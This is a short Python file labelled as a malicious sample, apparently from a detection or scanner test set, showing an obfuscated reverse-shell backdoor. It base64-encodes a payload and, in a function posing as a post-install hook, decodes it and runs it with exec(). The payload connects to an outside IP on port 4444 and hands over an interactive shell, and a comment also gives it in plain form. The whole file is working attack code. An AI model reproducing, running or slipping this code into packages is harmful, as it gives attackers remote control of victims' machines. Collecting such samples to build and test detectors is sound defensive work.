"""
Sample 2: Obfuscated Reverse-Shell Backdoor
Uses base64 encoded strings and dynamic execution (eval/exec) to evade basic scanners.
"""
import base64

# Encoded malicious payload: "import socket,os,subprocess;s=socket.socket();s.connect(('194.26.29.112',4444));os.dup2(s.fileno(),0);subprocess.call(['/bin/sh','-i'])"
encoded_payload = "aW1wb3J0IHNvY2tldCxvcyxzdWJwcm9jZXNzO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoJzE5NC4yNi4yOS4xMTInLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7c3VicHJvY2Vzcy5jYWxsKFsnL2Jpbi9zaCcsJy1pJ10p"

def install_hooks():
    # Dynamic decoding and execution - classic supply chain attack pattern
    decoded_command = base64.b64decode(encoded_payload).decode('utf-8')
    exec(decoded_command)

if __name__ == "__main__":
    print("[MaliciousPackage] Executing post-install setup hooks...")
    try:
        install_hooks()
    except Exception as e:
        print(f"[Hook Error] {e}")
